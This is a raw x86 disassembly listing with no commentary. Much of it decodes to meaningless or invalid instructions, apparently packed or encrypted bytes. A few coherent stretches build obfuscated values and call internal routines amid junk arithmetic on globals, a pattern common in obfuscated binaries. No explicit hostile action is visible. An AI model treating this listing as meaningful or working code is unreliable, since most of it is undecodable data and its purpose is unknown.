  40625f:	aas    
  406260:	or     BYTE PTR [ebx],dl
  406262:	inc    esp
  406263:	xor    DWORD PTR [esi-0x43f183b6],ecx
  406269:	jnp    0x40629a
  40626b:	jo     0x406245
  40626d:	pop    edx
  40626e:	mov    ds:0x6574628d,eax
  406273:	or     BYTE PTR gs:[edi],al
  406276:	jno    0x4062f1
  406278:	add    BYTE PTR [ebx+edi*8],ah
  40627b:	loope  0x4062c9
  40627d:	sub    esi,DWORD PTR [edx]
  40627f:	call   0x9d094fa0
  406284:	(bad)  
  406286:	daa    
  406287:	inc    edi
  406288:	shl    DWORD PTR [edi+ecx*4-0x20],0x16
  40628d:	mul    al
  40628f:	frstor [edx+0x4de00d8c]
  406295:	or     DWORD PTR [ebp-0x48],eax
  406298:	xor    al,0xf4
  40629a:	pop    eax
  40629b:	lahf   
  40629c:	cs pop esp
  40629e:	jns    0x40628f
  4062a0:	sbb    bl,cl
  4062a2:	jns    0x4062b2
  4062a4:	mov    esi,0xba8aecc1
  4062a9:	inc    esp
  4062aa:	sub    bl,cl
  4062ac:	and    ch,al
  4062ae:	adc    ecx,ebp
  4062b0:	ja     0x40626e
  4062b2:	jle    0x406255
  4062b4:	mov    eax,DWORD PTR ds:0x1ab2b7c
  4062ba:	jmp    FWORD PTR [eax+0x1e0bd52d]
  4062c0:	cmovl  esi,eax
  4062c3:	stc    
  4062c4:	dec    ecx
  4062c5:	je     0x406313
  4062c7:	in     eax,0x66
  4062c9:	and    al,0x73
  4062cb:	sbb    BYTE PTR [ebp+0x5a026482],0x5f
  4062d2:	or     dl,BYTE PTR [edx-0x26504bee]
  4062d8:	shl    BYTE PTR [edx-0x5f2b3977],cl
  4062de:	out    0x73,al
  4062e0:	in     al,dx
  4062e1:	push   esi
  4062e2:	pop    edx
  4062e3:	mov    bh,BYTE PTR [edx+0x9]
  4062e6:	retf   
  4062e7:	fadd   QWORD PTR [ecx+0x3c]
  4062ea:	nop
  4062eb:	in     eax,0x78
  4062ed:	shr    DWORD PTR [edx],0x7e
  4062f0:	nop
  4062f1:	inc    ebx
  4062f2:	sub    eax,0xec630e7c
  4062f7:	dec    ecx
  4062f8:	mov    ch,0x41
  4062fa:	push   eax
  4062fb:	mov    BYTE PTR [ecx],dl
  4062fd:	outs   dx,DWORD PTR ds:[esi]
  4062fe:	jmp    0x921c:0x833d6931
  406305:	sub    al,0xb9
  406307:	push   0x1d00bfa1
  40630c:	(bad)  
  40630d:	sahf   
  40630e:	add    al,0xe0
  406310:	out    0x95,eax
  406312:	aas    
  406313:	popf   
  406314:	push   esi
  406315:	pop    esi
  406316:	xlat   BYTE PTR ds:[ebx]
  406317:	rcl    bl,1
  406319:	fist   WORD PTR [ebx+edi*2-0x2a]
  40631d:	aas    
  40631e:	lods   eax,DWORD PTR ds:[esi]
  40631f:	pop    eax
  406320:	sub    ecx,DWORD PTR [edx+0x2bba18c0]
  406326:	pop    esi
  406327:	scas   eax,DWORD PTR es:[edi]
  406328:	outs   dx,BYTE PTR ds:[esi]
  406329:	fdiv   DWORD PTR [esi-0x6e]
  40632c:	inc    ebx
  40632d:	pop    eax
  40632e:	mov    ds:0x172555ca,eax
  406333:	fwait
  406334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406335:	sub    ch,0x42
  406338:	mov    edi,0x8c92221
  40633d:	lds    edx,FWORD PTR [edx]
  40633f:	lock push cs
  406341:	inc    edi
  406342:	aaa    
  406343:	ffreep st(0)
  406345:	stos   BYTE PTR es:[edi],al
  406346:	sbb    al,0x84
  406348:	repz add cl,BYTE PTR [esp+ecx*1]
  40634c:	push   ss
  40634d:	dec    esp
  40634e:	dec    ebp
  40634f:	repnz lds esp,FWORD PTR [esi]
  406352:	mov    ch,0xb3
  406354:	cmp    BYTE PTR [ebx],0xbf
  406357:	arpl   WORD PTR [edx-0x3d1b9603],ax
  40635d:	fnsave [edi-0x75b79efd]
  406363:	inc    ecx
  406364:	pop    edx
  406365:	inc    eax
  406366:	add    BYTE PTR [edx+0x188660ca],al
  40636c:	retf   0xf0c1
  40636f:	pop    esi
  406370:	ins    BYTE PTR es:[edi],dx
  406371:	or     DWORD PTR ds:0xae0f1998,edx
  406377:	add    edi,edi
  406379:	into   
  40637a:	jmp    0x5e81:0xf13e6ccf
  406381:	inc    edx
  406382:	mov    dh,0xce
  406384:	jl     0x4063a7
  406386:	in     eax,0x1d
  406388:	mov    edi,0x757814c3
  40638d:	add    al,0xc2
  40638f:	xchg   edx,eax
  406390:	dec    ebp
  406391:	mov    es,WORD PTR [ebx+0x2e40047]
  406397:	or     BYTE PTR [eax+edx*2+0x3bc6167e],cl
  40639e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40639f:	cs sbb bl,al
  4063a2:	add    al,0x44
  4063a4:	xor    al,0xf8
  4063a6:	test   eax,0x1ba0b51
  4063ab:	add    ebp,DWORD PTR [esp+ecx*2]
  4063ae:	mov    ch,0xfc
  4063b0:	ja     0x40641e
  4063b2:	sub    al,0xde
  4063b4:	retf   0x204
  4063b7:	scas   eax,DWORD PTR es:[edi]
  4063b8:	loopne 0x40636a
  4063ba:	in     al,0xcd
  4063bc:	and    DWORD PTR [esi+0xb],ebx
  4063bf:	mov    ah,0x52
  4063c1:	dec    ecx
  4063c2:	ret    0xf4dc
  4063c5:	sub    al,0x2a
  4063c7:	nop
  4063c8:	xchg   DWORD PTR [edi],ebx
  4063ca:	xor    eax,0x49520d79
  4063cf:	add    DWORD PTR [edi-0x147a1e70],esp
  4063d5:	pop    es
  4063d6:	push   cs
  4063d7:	push   ebx
  4063d8:	mov    ebp,0x25ca8558
  4063dd:	lea    edx,[edi-0x17]
  4063e0:	cdq    
  4063e1:	mov    dl,0xa7
  4063e3:	pop    edi
  4063e4:	arpl   WORD PTR [eax-0x45],si
  4063e7:	iret   
  4063e8:	dec    edx
  4063e9:	scas   al,BYTE PTR es:[edi]
  4063ea:	dec    esp
  4063eb:	add    eax,0x7581f6bd
  4063f0:	jmp    0x6c55:0x29d2e17c
  4063f7:	cmp    BYTE PTR [ecx-0x3c],al
  4063fa:	jg     0x4063b8
  4063fc:	inc    esi
  4063fd:	fincstp 
  4063ff:	mov    WORD PTR [ebx-0x79122437],ds
  406405:	and    BYTE PTR [ecx+edi*8-0xa],dl
  406409:	shl    BYTE PTR [esi+0x3a96514d],1
  40640f:	xchg   esi,eax
  406410:	pop    esi
  406411:	xor    al,0x77
  406413:	adc    esi,DWORD PTR [edx+eiz*2-0x52]
  406417:	(bad)  
  406418:	cmp    DWORD PTR [edx],esi
  40641a:	jl     0x406412
  40641c:	sub    BYTE PTR [ecx],dh
  40641e:	sbb    DWORD PTR [edx],ecx
  406420:	lea    ebx,[esi]
  406422:	add    al,0x19
  406424:	adc    ch,BYTE PTR [ebp-0x55]
  406427:	fwait
  406428:	mov    DWORD PTR [edx+edi*2],esi
  40642b:	mov    BYTE PTR [esp+ebp*4],ch
  40642e:	push   ss
  40642f:	or     esi,DWORD PTR [eax+edi*1]
  406432:	inc    eax
  406433:	jp     0x4064b2
  406435:	ret    0x948b
  406438:	xor    ah,0x4
  40643b:	pushf  
  40643c:	jecxz  0x4063d9
  40643e:	ret    0xab55
  406441:	rcl    DWORD PTR [esi],1
  406443:	xor    ecx,DWORD PTR [esp+ecx*1-0x7e1fba77]
  40644a:	xor    eax,0x434386
  40644f:	hlt    
  406450:	es inc ebx
  406452:	add    bh,al
  406454:	inc    ebp
  406455:	fdiv   DWORD PTR [ecx]
  406457:	mov    ch,0x9c
  406459:	clc    
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432de2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43439a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432de2,0x4326f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4326f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432dd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4326ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43442d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4326f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432dd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43438e,0x434415
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434386,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432dbe,0x432de6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434411,0x43441d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434386,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43439a,0x4326fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	fild   WORD PTR [eax-0x50]
  40655a:	mov    ah,0x59
  40655c:	imul   edi,DWORD PTR [esi],0x70
  40655f:	jo     0x406581
  406561:	jge    0x4065d3
  406563:	jo     0x4065aa
  406565:	aaa    
  406566:	cmp    bh,bl
  406568:	push   0x43e8b6e0
  40656d:	clc    
  40656e:	(bad)  
  40656f:	push   ebx
  406570:	mov    cl,0xb2
  406572:	ins    BYTE PTR es:[edi],dx
  406573:	les    ebp,FWORD PTR [edi+0x66e13391]
  406579:	fs push cs
  40657b:	ss xor ch,dh
  40657e:	adc    DWORD PTR [ebp-0x7cb8f621],ebp
  406584:	in     al,dx
  406585:	(bad)  
  406586:	gs loope 0x4065c1
  406589:	cmp    eax,0x9b6d12c6
  40658e:	and    bh,0x4b
  406591:	cmp    ch,0x2
  406594:	add    eax,0xe344399c
  406599:	dec    esp
  40659a:	hlt    
  40659b:	int3   
  40659c:	jo     0x406602
  40659e:	sub    al,bh
  4065a0:	mov    dh,0x5b
  4065a2:	cmp    BYTE PTR [ebx-0x68],0x74
  4065a6:	into   
  4065a7:	ret    0x1c12
  4065aa:	mov    eax,0xe970037f
  4065af:	pop    esp
  4065b0:	push   esi
  4065b1:	push   es
  4065b2:	adc    ecx,DWORD PTR [ebx-0x25aa42c6]
  4065b8:	aas    
  4065b9:	(bad)  
  4065ba:	push   esp
  4065bb:	add    dh,BYTE PTR [esi+0xe]
  4065be:	mov    dl,0xe2
  4065c0:	aaa    
  4065c1:	mov    WORD PTR [esi-0x3c],?
  4065c4:	ror    bh,1
  4065c6:	push   eax
  4065c7:	lods   eax,DWORD PTR ds:[esi]
  4065c8:	and    BYTE PTR [edi],al
  4065ca:	sub    al,0xbc
  4065cc:	iret   
  4065cd:	jle    0x406646
  4065cf:	mov    ebx,0x4406464b
  4065d4:	mov    esi,0x5445f384
  4065d9:	cmp    ah,BYTE PTR [edi+0x2b]
  4065dc:	rcr    DWORD PTR [ecx-0x41],0x36
  4065e0:	mov    edx,0x708d8273
  4065e5:	test   al,0xe6
  4065e7:	imul   ebx,DWORD PTR [ebx-0x1cd17405],0xffffffa1
  4065ee:	mov    bh,0x5c
  4065f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065f1:	loopne 0x406600
  4065f3:	sbb    al,0x96
  4065f5:	sub    ecx,DWORD PTR [eax+0x70]
  4065f8:	enter  0x1baa,0x40
  4065fc:	adc    BYTE PTR [ebx],bh
  4065fe:	int3   
  4065ff:	lods   eax,DWORD PTR ds:[esi]
  406600:	mov    ebp,DWORD PTR [edi+0x6876b0c0]
  406606:	jmp    0x4065c0
  406608:	fldln2 
  40660a:	sar    BYTE PTR [ebx],cl
  40660c:	inc    BYTE PTR ds:0x9f64
  406611:	sub    eax,0x2e428339
  406616:	add    al,0xaf
  406618:	xlat   BYTE PTR ds:[ebx]
  406619:	test   al,0x78
  40661b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40661c:	cs fwait
  40661e:	out    dx,eax
  40661f:	add    esp,DWORD PTR [ebx-0x420cdee4]
  406625:	scas   al,BYTE PTR es:[edi]
  406626:	sbb    al,BYTE PTR [edx+0x46]
  406629:	popa   
  40662a:	or     ebp,edi
  40662c:	fdiv   DWORD PTR [edx]
  40662e:	cmp    edx,0xdf705c39
  406634:	xchg   BYTE PTR [ecx+0x78],bh
  406637:	jl     0x4065ea
  406639:	mov    esp,0x9e672ef6
  40663e:	jne    0x40668d
  406640:	pushf  
  406641:	jmp    0xbf857fa2
  406646:	daa    
  406647:	jae    0x4065d6
  406649:	popa   
  40664a:	cmovbe edx,DWORD PTR [ecx-0x51]
  40664e:	in     al,0xde
  406650:	stos   DWORD PTR es:[edi],eax
  406651:	mov    DWORD PTR [edx+ebp*8-0xa],0x34f7f64f
  406659:	or     ebp,DWORD PTR [ebx]
  40665b:	pop    es
  40665c:	jg     0x40668a
  40665e:	xor    eax,0xd6e3826a
  406663:	dec    esp
  406664:	ins    BYTE PTR es:[edi],dx
  406665:	cmp    edx,DWORD PTR [edi-0x55919119]
  40666b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40666c:	in     al,dx
  40666d:	repz adc eax,0xf58de85a
  406673:	daa    
  406674:	popa   
  406675:	pop    esp
  406676:	bound  ebx,QWORD PTR [ebp+0x24]
  406679:	lahf   
  40667a:	or     eax,0xb10f4b90
  40667f:	test   eax,0x583004ef
  406684:	jno    0x40662f
  406686:	fwait
  406687:	push   es
  406688:	das    
  406689:	push   cs
  40668a:	mov    ebp,0x9cd8ae5a
  40668f:	aas    
  406690:	and    DWORD PTR [ebp-0x2336e802],edx
  406696:	and    al,0x4f
  406698:	bound  edx,QWORD PTR ds:0x4e841b80
  40669e:	xor    DWORD PTR cs:[ecx],esi
  4066a1:	nop
  4066a2:	mov    ecx,0x754c24f6
  4066a7:	xchg   DWORD PTR [ecx+ecx*1+0x10],eax
  4066ab:	popa   
  4066ac:	stos   BYTE PTR es:[edi],al
  4066ad:	mov    esi,0x5b8b7ff6
  4066b2:	ret    
  4066b3:	cwde   
  4066b4:	clc    
  4066b5:	dec    ebp
  4066b6:	dec    ecx
  4066b7:	bound  edx,QWORD PTR [eax+0x6f8f43]
  4066bd:	cwde   
  4066be:	sub    eax,0x9669aeae
  4066c3:	push   ebp
  4066c4:	and    BYTE PTR [edx-0x75539a1c],al
  4066ca:	mov    ebx,0x5df4bf93
  4066cf:	aad    0x51
  4066d1:	sub    al,0x3c
  4066d3:	inc    edi
  4066d4:	adc    ah,ch
  4066d6:	push   0x22d6e6b
  4066db:	mov    ecx,0x6cc2bc2c
  4066e0:	repz xor DWORD PTR [edx-0x7b],0xa43a27e4
  4066e8:	fs mov edi,0x4483fc85
  4066ee:	xor    al,0x70
  4066f0:	out    dx,al
  4066f1:	pusha  
  4066f2:	stc    
  4066f3:	fadd   QWORD PTR [eax+0x56eeb4ac]
  4066f9:	imul   esp,ebx,0xd1f143e0
  4066ff:	cdq    
  406700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406701:	aam    0xac
  406703:	mov    al,ds:0x17a3cf37
  406708:	push   esi
  406709:	jmp    0x6bba37f8
  40670e:	adc    BYTE PTR [ebx+ebp*8],bh
  406711:	cmc    
  406712:	in     eax,0x15
  406714:	inc    esi
  406715:	mov    eax,ds:0x74665277
  40671a:	jmp    0x722a3d77
  40671f:	test   BYTE PTR [ebp-0x51],dh
  406722:	sbb    DWORD PTR [ebx+0xa7fbb9b],esp
  406728:	fsubr  QWORD PTR [edi+0x2bbcf995]
  40672e:	mov    cl,0x4f
  406730:	(bad)  
  406731:	mov    bh,0x72
  406733:	cli    
  406734:	push   0x540ccb6a
  406739:	mov    esp,0xf224f7e
  40673e:	dec    ebp
  40673f:	es aad 0x1b
  406742:	mov    ecx,0x43c92441
  406747:	xor    esp,DWORD PTR [edi]
  406749:	sbb    al,0x6a
  40674b:	adc    al,0x19
  40674d:	mov    edi,0xeec4f421
  406752:	out    0x28,al
  406754:	xor    al,0xe1
  406756:	adc    ebp,DWORD PTR [edi+0x3691259d]
  40675c:	mov    ds:0xe18c3a75,eax
  406761:	(bad)  
  406762:	jmp    0xaeb1:0x5f928b07
  406769:	mov    ebx,ebp
  40676b:	gs test bl,dh
  40676e:	ja     0x406726
  406770:	pop    edx
  406771:	mov    cl,0x4
  406773:	sub    BYTE PTR [ecx+0x44562d6d],dl
  406779:	xchg   ecx,eax
  40677a:	aaa    
  40677b:	or     dh,ah
  40677d:	aaa    
  40677e:	xor    al,0x92
  406780:	jle    0x4067f5
  406782:	out    0xf8,eax
  406784:	xchg   edx,eax
  406785:	scas   al,BYTE PTR es:[edi]
  406786:	jnp    0x4067c6
  406788:	mov    cl,0xf
  40678a:	dec    ebp
  40678b:	sahf   
  40678c:	mov    al,ds:0xfb482d28
  406791:	pop    fs
  406793:	xor    eax,0xa748c5d7
  406798:	xchg   edx,eax
  406799:	call   0x82ae:0xfd7e172e
  4067a0:	ins    BYTE PTR es:[edi],dx
  4067a1:	dec    edi
  4067a2:	sar    BYTE PTR [ecx],0x3e
  4067a5:	mov    ecx,0xa5810ecd
  4067aa:	inc    ecx
  4067ab:	jl     0x4067e4
  4067ad:	dec    esi
  4067ae:	and    DWORD PTR [edx],ebx
  4067b0:	outs   dx,DWORD PTR ds:[esi]
  4067b1:	inc    ecx
  4067b2:	mov    esi,0x946e15e2
  4067b7:	mov    esi,0xb8e5b0f0
  4067bc:	cli    
  4067bd:	sbb    BYTE PTR [edx],cl
  4067bf:	or     eax,0xe8f5ff87
  4067c4:	frstor [ecx+eiz*2+0x1bd88464]
  4067cb:	mov    ch,BYTE PTR [eax+0x52961b6]
  4067d1:	sti    
  4067d2:	lahf   
  4067d3:	jl     0x40684b
  4067d5:	add    ebx,ebx
  4067d7:	imul   BYTE PTR [ebx+0x5f1b8d59]
  4067dd:	daa    
  4067de:	sub    BYTE PTR [edi-0x5e],dh
  4067e1:	and    dh,BYTE PTR [edx-0x52]
  4067e4:	out    dx,al
  4067e5:	inc    edi
  4067e6:	pop    eax
  4067e7:	pop    ebx
  4067e8:	fistp  DWORD PTR [esi-0x28]
  4067eb:	hlt    
  4067ec:	dec    esi
  4067ed:	or     al,0x62
  4067ef:	push   ebx
  4067f0:	pop    ebp
  4067f1:	test   eax,0xcf2a07f
  4067f6:	xor    dh,BYTE PTR [ecx+edi*2]
  4067f9:	push   0xf67a363d
  4067fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067ff:	jno    0x40678b
  406801:	imul   ecx,DWORD PTR [ebx+0x56],0xb
  406805:	ret    
  406806:	div    DWORD PTR [ebx+0x8]
  406809:	mov    dl,0x9b
  40680b:	cwde   
  40680c:	mov    edi,eax
  40680e:	sbb    dl,BYTE PTR [esi+0xc6e1939]
  406814:	popf   
  406815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406816:	data16 jg 0x40685f
  406819:	repz cmp dl,ah
  40681c:	ret    0xd0f6
  40681f:	gs enter 0xe0a9,0xe7
  406824:	pop    ecx
  406825:	jp     0x4067f0
  406827:	jno    0x4067b2
  406829:	jno    0x406830
  40682b:	sub    cl,dh
  40682d:	dec    edi
  40682e:	jo     0x4067b0
  406830:	xor    ecx,ecx
  406832:	das    
  406833:	(bad)  
  406834:	push   edx
  406835:	mov    al,0xea
  406837:	cli    
  406838:	and    BYTE PTR [edi],dl
  40683a:	pop    ss
  40683b:	and    DWORD PTR [ebp-0x33a1d02e],0x50
  406842:	sar    DWORD PTR [ecx+0x3a83a890],1
  406848:	xor    DWORD PTR [ecx],ebp
  40684a:	mov    ds:0xc3df21c9,eax
  40684f:	out    dx,eax
  406850:	call   0xceeb:0x47978270
  406857:	adc    DWORD PTR [ebx-0x614a1d7],edx
  40685d:	dec    ecx
  40685e:	cdq    
  40685f:	adc    eax,DWORD PTR [eax-0x4fca3e6a]
  406865:	cmp    ebx,DWORD PTR [ebx+edx*2]
  406868:	jecxz  0x406863
  40686a:	cwde   
  40686b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40686c:	dec    cl
  40686e:	lds    ebp,FWORD PTR [edi]
  406870:	dec    ebx
  406871:	into   
  406872:	sbb    esi,0xffffff85
  406875:	mov    ds,WORD PTR [esi+esi*4]
  406878:	cmp    eax,0x5d8fe3e
  40687d:	aaa    
  40687e:	mov    esp,0xe7197aa0
  406883:	stos   BYTE PTR es:[edi],al
  406884:	push   cs
  406885:	inc    ebp
  406886:	adc    ebx,0x35
  406889:	inc    edi
  40688a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40688b:	loope  0x4068fb
  40688d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40688e:	pop    ss
  40688f:	jb     0x4068c0
  406891:	shl    BYTE PTR [ecx],0xbb
  406894:	test   eax,eax
  406896:	mov    DWORD PTR ds:0x434425,0x7971
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432dca,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432de6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432de2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434366,0x11
  4068da:	cmp    DWORD PTR ds:0x434366,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434366,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434421
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432c3a
  40690c:	cmp    DWORD PTR ds:0x434366,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434366
  40691e:	dec    eax
  40691f:	mov    ds:0x434366,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434366
  40692c:	dec    eax
  40692d:	mov    ds:0x434366,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	dec    edi
  406990:	sahf   
  406991:	and    ebx,DWORD PTR [ecx+0x1b]
  406994:	cmp    dh,BYTE PTR [eax+0x70]
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406946
  40699c:	cmp    dh,BYTE PTR [ecx]
  40699e:	imul   ebp,esp,0x4e
  4069a1:	arpl   WORD PTR [edi+0x17a2509a],cx
  4069a7:	mov    dl,0x74
  4069a9:	imul   eax,DWORD PTR [edi-0x2e3428d],0x711c3ad6
  4069b3:	fimul  WORD PTR [eax]
  4069b5:	test   BYTE PTR [esi],0xc4
  4069b8:	dec    ebx
  4069b9:	inc    ecx
  4069ba:	adc    bl,ah
  4069bc:	or     BYTE PTR [edi+0x0],dh
  4069bf:	into   
  4069c0:	and    DWORD PTR [edi+0x69842d4a],eax
  4069c6:	mov    bh,0x35
  4069c8:	lahf   
  4069c9:	add    eax,0x452ff08e
  4069ce:	add    DWORD PTR [ebp+0x1c6ac56d],ebx
  4069d4:	xor    al,0x7e
  4069d6:	push   es
  4069d7:	daa    
  4069d8:	stos   DWORD PTR es:[edi],eax
  4069d9:	pop    ebp
  4069da:	xchg   ebx,eax
  4069db:	fbstp  TBYTE PTR [eax]
  4069dd:	pushf  
  4069de:	test   al,0xdb
  4069e0:	inc    esp
  4069e1:	inc    edx
  4069e2:	fstp   TBYTE PTR [ecx-0xf]
  4069e5:	push   ebx
  4069e6:	and    ebx,DWORD PTR [ebx-0x2ae840db]
  4069ec:	pop    ebp
  4069ed:	loop   0x4069ba
  4069ef:	lods   al,BYTE PTR ds:[esi]
  4069f0:	cmp    DWORD PTR [ebx-0x313660ce],0x25641897
  4069fa:	cmp    bl,BYTE PTR [ebp-0x1e]
  4069fd:	lea    edi,[edx+0x7a6d7276]
  406a03:	pop    ds
  406a04:	dec    ebp
  406a05:	clc    
  406a06:	(bad)  
  406a08:	push   cs
  406a09:	stc    
  406a0a:	nop
  406a0b:	dec    esi
  406a0c:	retf   0xd63
  406a0f:	in     al,0x9e
  406a11:	ss ins DWORD PTR es:[edi],dx
  406a13:	mov    ebx,0x3a9d5c74
  406a18:	jle    0x406a68
  406a1a:	mov    cl,0x46
  406a1c:	cmc    
  406a1d:	or     DWORD PTR [ebx],esp
  406a1f:	and    ebx,DWORD PTR [ecx-0x36]
  406a22:	mov    WORD PTR [edx-0x26aee3e7],?
  406a28:	fst    st(4)
  406a2a:	jmp    0x4069d5
  406a2c:	dec    ebp
  406a2d:	jns    0x406a85
  406a2f:	in     al,dx
  406a30:	push   esp
  406a31:	push   ecx
  406a32:	xor    al,0x7a
  406a34:	in     eax,dx
  406a35:	xor    al,0x8f
  406a37:	fmul   DWORD PTR [edi+ebp*1+0x621756f1]
  406a3e:	push   esp
  406a3f:	loope  0x406a1d
  406a41:	loope  0x406a15
  406a43:	adc    BYTE PTR [edx+edx*2-0x64],dh
  406a47:	cmp    DWORD PTR [esi],esp
  406a49:	pop    ecx
  406a4a:	add    BYTE PTR [edi+0x3d],0xe2
  406a4e:	jmp    ebp
  406a50:	mov    cl,0x51
  406a52:	(bad)  
  406a53:	loopne 0x406a3b
  406a55:	push   esi
  406a56:	xchg   edx,eax
  406a57:	out    0x37,al
  406a59:	outs   dx,DWORD PTR ds:[esi]
  406a5a:	hlt    
  406a5b:	push   ds
  406a5c:	pop    ss
  406a5d:	out    dx,al
  406a5e:	dec    edx
  406a5f:	shl    BYTE PTR [ebx],cl
  406a61:	xor    bl,0xb1
  406a64:	dec    ecx
  406a65:	mov    esi,0xae233fc0
  406a6a:	mov    esp,0x8c0c958f
  406a6f:	test   dl,bh
  406a71:	or     eax,0xe90d464
  406a76:	mov    ah,0x2d
  406a78:	push   0x63
  406a7a:	and    eax,0xbc927648
  406a7f:	sar    DWORD PTR [eax-0x23cccf36],0x63
  406a86:	lods   al,BYTE PTR ds:[esi]
  406a87:	adc    bl,bl
  406a89:	cmp    esp,eax
  406a8b:	dec    eax
  406a8c:	fisub  DWORD PTR [edx+0x102b3d87]
  406a92:	xor    dl,ch
  406a94:	lock sub DWORD PTR [ecx],eax
  406a97:	cmp    al,0xfc
  406a99:	rol    esi,cl
  406a9b:	push   ss
  406a9c:	pop    ecx
  406a9d:	popf   
  406a9e:	jg     0x406aeb
  406aa0:	jmp    0xfb8d:0xdca109d3
  406aa7:	mov    dh,0xd7
  406aa9:	and    bh,bl
  406aab:	jle    0x406b28
  406aad:	jbe    0x406ab9
  406aaf:	jo     0x406a7d
  406ab1:	pop    edi
  406ab2:	pop    ecx
  406ab3:	xchg   edx,eax
  406ab4:	aad    0x7
  406ab6:	jo     0x406a4c
  406ab8:	pop    es
  406ab9:	xlat   BYTE PTR ds:[ebx]
  406aba:	jmp    0x406a4a
  406abc:	aam    0xf5
  406abe:	into   
  406abf:	sbb    eax,0x9f4e3ea4
  406ac4:	push   cs
  406ac5:	pop    ebx
  406ac6:	sbb    dl,0x44
  406ac9:	ret    
  406aca:	push   eax
  406acb:	adc    BYTE PTR [ebx+esi*8-0x36],0x8d
  406ad0:	and    eax,0xab0ae29d
  406ad5:	dec    ebx
  406ad6:	cmp    al,0xd3
  406ad8:	les    ebx,FWORD PTR [ecx]
  406ada:	bound  ecx,QWORD PTR [ebx]
  406adc:	mov    bl,BYTE PTR [eax+0x48]
  406adf:	xor    esi,DWORD PTR [edi]
  406ae1:	in     eax,0xdc
  406ae3:	daa    
